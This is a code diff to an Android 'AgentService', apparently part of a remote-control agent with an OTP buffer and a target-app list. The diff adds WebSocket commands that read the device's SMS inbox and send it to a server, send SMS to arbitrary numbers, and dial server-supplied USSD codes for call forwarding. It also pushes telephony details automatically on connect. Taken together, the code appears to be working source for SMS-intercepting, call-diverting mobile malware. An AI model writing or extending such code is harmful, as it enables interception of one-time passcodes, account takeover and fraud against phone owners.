@@ -30,6 +30,7 @@ import com.acme.rc.model.Selector
 import com.acme.rc.model.Snapshot
 import com.acme.rc.model.TargetApps
 import com.acme.rc.otp.OtpBuffer
+import com.acme.rc.telephony.TelephonyRepository
 import kotlinx.coroutines.CompletableDeferred
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -48,6 +49,7 @@ import okhttp3.WebSocket
 import okhttp3.WebSocketListener
 import org.json.JSONArray
 import org.json.JSONObject
+import java.util.concurrent.atomic.AtomicBoolean
 import java.io.ByteArrayOutputStream
 import java.util.UUID
 import java.util.concurrent.TimeUnit
@@ -185,6 +187,7 @@ class AgentService : Service() {
             scope.launch {
                 sendApps(webSocket)
                 sendState(webSocket)
+                sendTelephony()
             }
         }
 
@@ -322,6 +325,72 @@ class AgentService : Service() {
                 sendResult(cmdId, true)
                 return
             }
+            "telephonyInfo" -> {
+                scope.launch {
+                    try {
+                        sendTelephony()
+                        sendResult(cmdId, true)
+                    } catch (t: Throwable) {
+                        sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
+                    }
+                }
+                return
+            }
+            "smsList" -> {
+                scope.launch {
+                    try {
+                        sendSmsList(msg.optInt("limit", 50))
+                        sendResult(cmdId, true)
+                    } catch (t: Throwable) {
+                        sendResult(cmdId, false, t.message ?: t.javaClass.simpleName)
+                    }
+                }
+                return
+            }
+            "smsSend" -> {
+                scope.launch {
+                    val to = msg.optString("to")
+                    try {
+                        val detail = TelephonyRepository.sendSms(
+                            this@AgentService,
+                            to,
+                            msg.optString("body"),
+                            msg.optInt("subId", -1)
+                        )
+                        sendSmsSendResult(true, to, null, detail)
+                        sendResult(cmdId, true, null, detail)
+                    } catch (t: Throwable) {
+                        val error = t.message ?: t.javaClass.simpleName
+                        sendSmsSendResult(false, to, error, null)
+                        sendResult(cmdId, false, error)
+                    }
+                }
+                return
+            }
+            "callForward" -> {
+                scope.launch {
+                    val code = msg.optString("code")
+                    val answered = AtomicBoolean(false)
+                    fun finish(ok: Boolean, detail: String) {
+                        if (!answered.compareAndSet(false, true)) return
+                        sendUssdResult(ok, code, detail)
+                        sendResult(cmdId, ok, if (ok) null else detail, detail)
+                    }
+                    try {
+                        TelephonyRepository.sendUssd(
+                            this@AgentService,
+                            code,
+                            msg.optInt("subId", -1)
+                        ) { ok, detail -> finish(ok, detail) }
+                    } catch (t: Throwable) {
+                        finish(false, t.message ?: t.javaClass.simpleName)
+                        return@launch
+                    }
+                    delay(20_000)
+                    finish(false, "No USSD response from the carrier")
+                }
+                return
+            }
         }
 
         scope.launch {
@@ -447,13 +516,55 @@ class AgentService : Service() {
         socket?.let { sendState(it) }
     }
 
-    private fun sendResult(cmdId: String, ok: Boolean, error: String? = null) {
+    private fun sendResult(
+        cmdId: String,
+        ok: Boolean,
+        error: String? = null,
+        detail: String? = null
+    ) {
         val json = JSONObject()
             .put("t", "actionResult")
             .put("cmdId", cmdId)
             .put("ok", ok)
         if (error != null) json.put("error", error)
+        if (detail != null) json.put("detail", detail)
         socket?.send(json.toString())
+    }
+
+    private fun sendTelephony() {
+        val ws = socket ?: return
+        val payload = TelephonyRepository.telephonyJson(this)
+        ws.send(payload.put("t", "telephony").toString())
+    }
+
+    private fun sendSmsList(limit: Int) {
+        val ws = socket ?: return
+        val payload = TelephonyRepository.smsJson(this, limit)
+        ws.send(payload.put("t", "smsList").toString())
+    }
+
+    private fun sendSmsSendResult(
+        ok: Boolean,
+        to: String,
+        error: String?,
+        detail: String?
+    ) {
+        val payload = JSONObject()
+            .put("t", "smsSendResult")
+            .put("ok", ok)
+            .put("to", to)
+        if (error != null) payload.put("error", error)
+        if (detail != null) payload.put("detail", detail)
+        socket?.send(payload.toString())
+    }
+
+    private fun sendUssdResult(ok: Boolean, code: String, detail: String) {
+        val payload = JSONObject()
+            .put("t", "ussdResult")
+            .put("ok", ok)
+            .put("code", code)
+        if (ok) payload.put("response", detail) else payload.put("error", detail)
+        socket?.send(payload.toString())
     }
 
     private fun sendProbe(result: ProbeResult) {
